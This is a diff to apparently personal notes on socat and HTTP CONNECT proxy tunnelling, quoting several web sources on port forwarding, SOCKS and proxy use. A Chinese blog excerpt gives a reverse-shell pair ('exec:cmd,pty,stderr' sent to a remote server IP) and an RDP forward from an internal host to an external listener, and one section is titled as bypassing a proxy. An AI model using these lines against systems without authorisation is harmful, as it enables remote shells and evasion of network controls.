@@ -12,7 +12,7 @@ The CONNECT method is a way to tunnel any kind of connection through an HTTP pro
 
 If client software supports connection through 'HTTP CONNECT'-enabled (HTTPS) proxy it can be any high level protocol that can work with such a proxy (VPN, SSH, SQL, version control, etc.)
 
-
+=====================================
 http://wiki.yobi.be/wiki/Bypass_Proxy
 socat TCP4-LISTEN:1234 OPENSSL:my.server:443,verify=0 &
 socat TCP4-LISTEN:4321 PROXY:127.0.0.1:another.server:22,proxyport=1234 &
@@ -28,6 +28,7 @@ socat TCP4-LISTEN:2222,bind=127.0.0.1 OPENSSL:127.0.0.1:3333,verify=0 &
 socat TCP4-LISTEN:1111,bind=127.0.0.1 PROXY:127.0.0.1:another.server:22,proxyport=2222,proxyauth=user:pass &
 ssh -p 1111 127.0.0.1
 
+=====================================
 https://stackoverflow.com/questions/9596594/why-is-fork-needed-by-socat-when-connecting-to-a-web-server
 With fork
 I wanted to put a software intermediary between the browser and the web server, and so began experimenting with socat. The following works just fine:
@@ -40,27 +41,21 @@ the local rails web site is quite broken looking in the browser.
 
 socat TCP-LISTEN:80,reuseaddr,fork,su=nobody TCP:www.bytesandbones.com:80
 
-
+=====================================
 http://www.cnblogs.com/shangdawei/p/3843039.html
 
 1、socat是支持cmdshell反连的，这点最重要的我在google和百度了一堆都没找到，自己研究了半天出来了。
-
    server:socat readline udp-listen:port  -------socat支持udp、tcp、https等，我测试了tcp和udp
-
    client:socat udp:serverip:port exec:cmd,pty,stderr
-   
-   
 
 2、端口转发功能：上文写的是错误的，根本无法实现。大家测试过就知道了。
-
    正确的应该如下：
-
    外部：socat tcp-listen:11161,reuseaddr,fork tcp-listen:9833
-
    内部：socat tcp:外部ip:11161,reuseaddr,fork tcp:127.0.0.1:3389
 
 不加reuseaddr,fork是无法成功连接的，具体原因大家可以再百度下，有详细介绍。
 
+=====================================
 https://trent.utfs.org/wiki/Proxy
 Socat
 Socat can not act[2] as a proxy, but only talk to a proxy server. For example, a SOCKS proxy:
@@ -69,3 +64,17 @@ This will open a SOCKS4/SOCKS5 proxy on :8080 where a browser can connect to. Al
 
 socat TCP-LISTEN:1234,fork SOCKS4:127.0.0.1:dest.example.com:80,socksport=8080
 Now a browser can connect to :1234 (socat) which will in turn connect to :8080 (ssh) which will in turn direct traffic to remote.domain.com to fetch content from dest.example.com.
+
+=====================================
+如果,socat fork出的proxy是http proxy type, 那socat的tcp-listen本身也會是http proxy type
+
+=====================================
+socat READLINE,noecho='[Pp]assword:' EXEC:'ftp ftp.server.com',pty,setsid,ctty
+
+wraps a command line history (READLINE) around the EXEC'uted ftp client utility. This allows editing and reuse of FTP commands for relatively comfortable browsing through the ftp directory hierarchy. The password is echoed! pty is required to have ftp issue a prompt. Nevertheless, there may occur some confusion with the password and FTP prompts.
+
+socat TCP4-LISTEN:2022,reuseaddr,fork PROXY:proxy:www.domain.org:22,proxyport=3128,proxyauth=user:pass
+
+starts a forwarder that accepts connections on port 2022, and directs them through the proxy daemon listening on port 3128 (proxyport) on host proxy, using the CONNECT method, where they are authenticated as "user" with "pass" (proxyauth). The proxy should establish connections to host www.domain.org on port 22 then.
+
+socat TCP4-LISTEN:3389,fork SOCKS4:127.0.0.1:192.168.1.100:3389,socksport=9999
